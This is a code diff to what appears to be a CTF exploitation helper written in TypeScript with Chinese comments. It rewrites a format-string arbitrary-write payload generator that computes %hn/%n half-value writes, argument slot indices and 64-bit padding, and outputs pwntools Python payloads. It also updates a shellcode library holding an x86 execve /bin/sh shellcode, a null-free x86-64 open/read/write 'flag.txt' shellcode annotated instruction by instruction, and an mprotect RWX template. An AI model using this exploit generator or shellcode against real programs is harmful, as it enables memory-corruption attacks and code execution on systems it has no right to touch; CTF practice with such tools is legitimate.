@@ -100,9 +100,13 @@ export type FmtstrWriteResult =
   | { ok: true; payload: string; python: string; writes: Array<{ addr: number; half: 'low' | 'high'; value: number; width: 2 | 4 }>; note: string }
   | { ok: false; error: string };
 
-// 半值写入法（32 位拆 2×2 字节 / 64 位拆 2×4 字节）：两次 %hn，先小后大避免计数回绕。
-// 32 位地址放串首（printf 原样输出计入已打印数）；64 位地址含 NUL 必须后置（printf 遇 NUL
-// 截断格式串，pwntools 对 64 位同样用地址后置布局）。
+// 半值写入法（32 位拆 2×2 字节 %hn / 64 位拆 2×4 字节 %n）：两次写入，先小后大避免计数回绕。
+// %k$hn/%k$n 的 k 是绝对 vararg 序号：
+//  · 32 位地址放串首——串首两个地址本身就被 printf 当作第 argIndex / argIndex+1 个 vararg
+//    读入，所以写入序号 kLow=argIndex、kHigh=argIndex+1（地址字节被 printf 原样输出，计入已打印数）。
+//  · 64 位地址含 NUL 必须后置（printf 遇 NUL 截断格式串）：fmt 尾部补 'a' 填充使地址起始
+//    字节落在 8 字节槽边界（pwntools 同款布局），第一个地址槽 = argIndex + ⌈fmt长度/8⌉
+//    （含 padding），k 按此动态求解；padding 字符在两条写入之后输出，不影响半值计数。
 export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult => {
   const { target, value, argIndex, bits } = request;
   if (!Number.isFinite(target) || target <= 0 || target >= Number.MAX_SAFE_INTEGER) return { ok: false, error: '目标地址无效。' };
@@ -114,16 +118,40 @@ export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult
   const low = value % modulus;
   const high = Math.floor(value / modulus);
   const addrBytes = bits === 32 ? 8 : 16;
-  // 32 位：串首两个地址占 2 槽（计入序号）。64 位：地址后置，但其两个槽紧随格式串
-  // 指针所在栈区之后，序号同样按 argIndex+2/+3 起算，发送前用 %p 链实测校准。
-  const kLow = argIndex + 2;
-  const kHigh = argIndex + 3;
   const addrLo = target;
   const addrHi = target + halfWidth;
+  // 求解写入序号 kLow/kHigh。
+  // 64 位半值宽 4 字节，写入用 %n（int，4 字节）；32 位半值 2 字节用 %hn。
+  const writeDirective = bits === 64 ? '$n' : '$hn';
+  let kLow: number;
+  let padding = 0;
+  if (bits === 32) {
+    kLow = argIndex;
+  } else {
+    // 64 位：kLow = argIndex + ⌈fmt长度/8⌉，而 fmt 长度含 k 的十进制位数——定点迭代求解
+    //（k 每增大 1 fmt 至多多 2 字符，槽位随之 +0/+1，实际数步内收敛）。
+    // 计数文本按"先写小半值再写大半值"的实际顺序拼接（与下方 parts 生成一致）。
+    const first = Math.min(low, high);
+    const second = Math.max(low, high);
+    const countText = (from: number, to: number) => {
+      const count = ((to - from) % modulus + modulus) % modulus;
+      return count > 0 ? `%${count}c` : '';
+    };
+    kLow = argIndex + 2;
+    for (let i = 0; i < 64; i++) {
+      const fmtLen = countText(0, first).length + `%${kLow}${writeDirective}`.length
+        + countText(first, second).length + `%${kLow + 1}${writeDirective}`.length;
+      padding = (8 - (fmtLen % 8)) % 8;
+      const resolved = argIndex + (fmtLen + padding) / 8;
+      if (resolved === kLow) break;
+      kLow = resolved;
+    }
+  }
+  const kHigh = kLow + 1;
   const sorted = low <= high
     ? [{ half: 'low' as const, v: low, k: kLow }, { half: 'high' as const, v: high, k: kHigh }]
     : [{ half: 'high' as const, v: high, k: kHigh }, { half: 'low' as const, v: low, k: kLow }];
-  // 32 位串首地址被原样输出计入；64 位后置地址不占串首计数。
+  // 32 位串首地址被原样输出计入已打印数；64 位后置地址不占计数（格式串在地址前已被 NUL 截断）。
   let printed = bits === 32 ? addrBytes : 0;
   const parts: string[] = [];
   const writes: Array<{ addr: number; half: 'low' | 'high'; value: number; width: 2 | 4 }> = [];
@@ -131,8 +159,13 @@ export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult
     const count = ((entry.v - printed) % modulus + modulus) % modulus;
     if (count > 0) parts.push(`%${count}c`); // %0c 会输出 1 字符使计数偏 1，count=0 时跳过
     printed = entry.v;
-    parts.push(`%${entry.k}$hn`);
+    parts.push(`%${entry.k}${writeDirective}`);
     writes.push({ addr: entry.half === 'low' ? addrLo : addrHi, half: entry.half, value: entry.v, width: halfWidth as 2 | 4 });
+  }
+  if (bits === 64 && padding > 0) {
+    // 'a' 填充把地址推到槽边界；printf 对其按字面输出，但位于两条 %hn 之后，不影响计数。
+    parts.push('a'.repeat(padding));
+    printed += padding;
   }
   const addrText = `p${bits}(0x${addrLo.toString(16)}) + p${bits}(0x${addrHi.toString(16)})`;
   const fmtStr = `b'${parts.join('')}'`;
@@ -144,16 +177,16 @@ export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult
     + `payload = ${payload}\n`
     + `# 写入槽：${writes.map(w => `0x${w.addr.toString(16)} ← 0x${w.value.toString(16)}（${w.half}）`).join('；')}\n`
     + (bits === 64
-      ? '# 64 位：地址后置防 NUL 截断；槽号随栈布局漂移，发送前先用 %p 链实测校准 k。'
-      : '# 32 位经典布局：串首两个地址恰占 2 槽（k 已含），%c 计数已扣地址字节。');
+      ? `# 64 位：地址后置防 NUL 截断，'a' 填充已对齐 8 字节槽，k=${kLow}/${kHigh} 按格式串实际槽数算得（%n 写 4 字节半值）。`
+      : `# 32 位经典布局：串首两个地址就是第 ${argIndex}/${argIndex + 1} 个 vararg，%c 计数已扣地址字节。`);
   return {
     ok: true,
     payload,
     python,
     writes,
     note: bits === 32
-      ? '两段 %hn 半值写入：先写小值再写大值，避免 %c 计数回绕；地址放串首时本身占 2 个参数槽（序号已自动 +2）。'
-      : '两段 %hn 半值写入：64 位地址后置（含 NUL 不能放串首）；槽号请先用 %p 链实测校准。',
+      ? `两段 %hn 半值写入：先写小值再写大值，避免 %c 计数回绕；地址放串首时本身就是第 ${argIndex}/${argIndex + 1} 个 vararg（%k$hn 直接引用）。`
+      : `两段 %n 半值写入（64 位半值 4 字节）：地址后置（含 NUL 不能放串首），'a' 填充已对齐槽边界，写入序号 k=${kLow}/${kHigh}。`,
   };
 };
 
@@ -178,12 +211,32 @@ const SC_EXECVE_X86 = Uint8Array.from([
   0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
   0x89, 0xc1, 0x89, 0xc2, 0xb0, 0x0b, 0xcd, 0x80,
 ]);
-// x86-64 ORW（open/read/write flag.txt）骨架：需按题目路径改 string 段——给框架 + 注释。
+// x86-64 ORW（open/read/write flag.txt）骨架：路径 NUL 终止 + 栈缓冲读取 + write 复用同缓冲。
+// 指令编码不含 0x00/0x0a（badChars 留空）；改 0x48,0xb8 后 8 字节即换文件名。
+// xor rsi,rsi + push rsi：rsi=0 兼作 O_RDONLY 与路径终止符（栈上的 0，不占编码字节）；
+// open 后 rdi=fd、sub rsp,rdx 预留 0x3000 栈缓冲、rsi 指向缓冲；write 前不再动 rsi。
 const SC_ORW_X64 = Uint8Array.from([
-  0x48, 0x31, 0xd2, 0x48, 0xb8, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, 0x50, 0x48,
-  0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7,
-  0x48, 0x31, 0xd2, 0xb6, 0x30, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc2,
-  0x48, 0x31, 0xf6, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05,
+  0x48, 0x31, 0xf6,                   // xor rsi, rsi
+  0x56,                               // push rsi（路径 NUL 终止符）
+  0x48, 0xb8, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, // movabs rax, "flag.txt"
+  0x50,                               // push rax
+  0x48, 0x89, 0xe7,                   // mov rdi, rsp
+  0x31, 0xc0,                         // xor eax, eax
+  0xb0, 0x02,                         // mov al, 2（SYS_open，rsi=0 → O_RDONLY）
+  0x0f, 0x05,                         // syscall → rax = fd
+  0x48, 0x89, 0xc7,                   // mov rdi, rax
+  0x48, 0x31, 0xd2,                   // xor rdx, rdx
+  0xb6, 0x30,                         // mov dh, 0x30 → rdx = 0x3000
+  0x48, 0x29, 0xd4,                   // sub rsp, rdx（预留 0x3000 栈缓冲）
+  0x48, 0x89, 0xe6,                   // mov rsi, rsp（读缓冲）
+  0x31, 0xc0,                         // xor eax, eax（SYS_read）
+  0x0f, 0x05,                         // syscall
+  0x48, 0x89, 0xc2,                   // mov rdx, rax（write 长度 = 实读字节数）
+  0x6a, 0x01,                         // push 1
+  0x5f,                               // pop rdi（fd = 1 stdout）
+  0x31, 0xc0,                         // xor eax, eax
+  0xb0, 0x01,                         // mov al, 1（SYS_write，rsi 仍指向同一缓冲）
+  0x0f, 0x05,                         // syscall
 ]);
 // x86-64 mprotect+rwx 模板开头（页对齐由调用方处理）：常用于 NX off 前置或 ret2shellcode。
 const SC_MPROTECT_X64 = Uint8Array.from([
@@ -207,14 +260,14 @@ export const SHELLCODE_LIBRARY: ReadonlyArray<ShellcodeEntry> = [
   {
     id: 'orw-x64', title: 'ORW flag.txt x86-64', arch: 'x86-64',
     bytes: SC_ORW_X64,
-    summary: 'open("flag.txt")→read 0x30→write(1)。改 0x48,0xb8 后 8 字节即换文件名。',
-    badChars: [0x00],
+    summary: 'open("flag.txt")→read 0x3000（rsp 栈缓冲）→write(1)；read/write 共用同一缓冲。改 0x48,0xb8 后 8 字节即换文件名。编码不含 00/0a。',
+    badChars: [],
   },
   {
     id: 'mprotect-x64', title: 'mprotect 页改 RWX x86-64', arch: 'x86-64',
     bytes: SC_MPROTECT_X64,
     summary: 'rdi=rsp 页对齐，mprotect(addr, len, RWX)；NX off 场景配合读入 shellcode。',
-    badChars: [0x00],
+    badChars: [0x00, 0x0a], // mov eax,10 的立即数含 0x0a
   },
 ];
 
